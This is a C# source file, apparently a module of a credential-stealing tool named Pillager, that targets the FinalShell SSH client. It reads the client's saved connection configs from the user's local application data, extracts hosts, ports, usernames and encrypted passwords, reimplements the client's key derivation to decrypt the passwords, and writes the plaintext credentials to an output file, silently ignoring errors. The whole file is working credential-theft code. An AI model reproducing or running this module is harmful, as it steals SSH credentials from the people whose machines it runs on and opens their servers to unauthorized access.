using Pillager.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Tools
{
    internal class FinalShell : ICommand
    {
        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
            foreach (var file in Directory.GetFiles(connPath))
            {
                if (!file.EndsWith("_connect_config.json")) continue;
                string connjson = File.ReadAllText(file);
                string user_name = ""; 
                string password = ""; 
                string host = "";
                string port = "";
                var user_names = new Regex("\"user_name\":\"(.*?)\"", RegexOptions.Compiled).Matches(connjson);
                var passwords = new Regex("\"password\":\"(.*?)\"", RegexOptions.Compiled).Matches(connjson);
                var hosts = new Regex("\"host\":\"(.*?)\"", RegexOptions.Compiled).Matches(connjson);
                var ports = new Regex("\"port\":(.*?),", RegexOptions.Compiled).Matches(connjson);
                foreach (Match prof in user_names)
                {
                    if (prof.Success)
                        user_name = prof.Groups[1].Value;
                }
                foreach (Match prof in passwords)
                {
                    if (prof.Success)
                        password = prof.Groups[1].Value;
                }
                foreach (Match prof in hosts)
                {
                    if (prof.Success)
                        host = prof.Groups[1].Value;
                }
                foreach (Match prof in ports)
                {
                    if (prof.Success)
                        port = prof.Groups[1].Value;
                }
                sb.AppendLine("host: "+ host);
                sb.AppendLine("port: " + port);
                sb.AppendLine("user_name: " + user_name);
                sb.AppendLine("password: " + decodePass(password));
                sb.AppendLine();
            }
            return sb.ToString();
        }

        public byte[] desDecode(byte[] data, byte[] head)
        {
            byte[] TripleDesIV = { 0, 0, 0, 0, 0, 0, 0, 0 };
            byte[] key = new byte[8];
            Array.Copy(head, key, 8);
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            des.Key = key;
            des.IV = TripleDesIV; 
            des.Padding = PaddingMode.PKCS7;
            des.Mode = CipherMode.ECB;
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }

        public string decodePass(string data)
        {
            if (data == null)
            {
                return null;
            }

            byte[] buf = Convert.FromBase64String(data);
            byte[] head = new byte[8];
            Array.Copy(buf, 0, head, 0, head.Length);
            byte[] d = new byte[buf.Length - head.Length];
            Array.Copy(buf, head.Length, d, 0, d.Length);
            byte[] randombytes = ranDomKey(head);
            byte[] bt = desDecode(d, randombytes);
            var rs = Encoding.ASCII.GetString(bt);

            return rs;
        }
        byte[] ranDomKey(byte[] head)
        {
            long ks = 3680984568597093857L / new JavaRng(head[5]).nextInt(127);
            JavaRng random = new JavaRng(ks);
            int t = head[0];

            for (int i = 0; i < t; ++i)
            {
                random.nextLong();
            }

            long n = random.nextLong();
            JavaRng r2 = new JavaRng(n);
            long[] ld = { head[4], r2.nextLong(), head[7], head[3], r2.nextLong(), head[1], random.nextLong(), head[2] };
            using (MemoryStream stream = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    long[] var15 = ld;
                    int var14 = ld.Length;

                    for (int var13 = 0; var13 < var14; ++var13)
                    {
                        long l = var15[var13];

                        try
                        {
                            byte[] writeBuffer = new byte[8];
                            writeBuffer[0] = (byte)(l >> 56);
                            writeBuffer[1] = (byte)(l >> 48);
                            writeBuffer[2] = (byte)(l >> 40);
                            writeBuffer[3] = (byte)(l >> 32);
                            writeBuffer[4] = (byte)(l >> 24);
                            writeBuffer[5] = (byte)(l >> 16);
                            writeBuffer[6] = (byte)(l >> 8);
                            writeBuffer[7] = (byte)(l >> 0);
                            writer.Write(writeBuffer);
                        }
                        catch
                        {
                            return null;
                        }
                    }

                    byte[] keyData = stream.ToArray();
                    keyData = md5(keyData);
                    return keyData;
                }
            }
        }

        public byte[] md5(byte[] data)
        {
            try
            {
                MD5 md5Hash = MD5.Create();
                byte[] md5data = md5Hash.ComputeHash(data);
                return md5data;
            }
            catch
            { return null; }
        }

        public override void Save(string path)
        {
            try
            {
                string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
                if (!Directory.Exists(connPath)) return;
                string savepath = Path.Combine(path, "FinalShell");
                Directory.CreateDirectory(savepath);
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "FinalShell.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
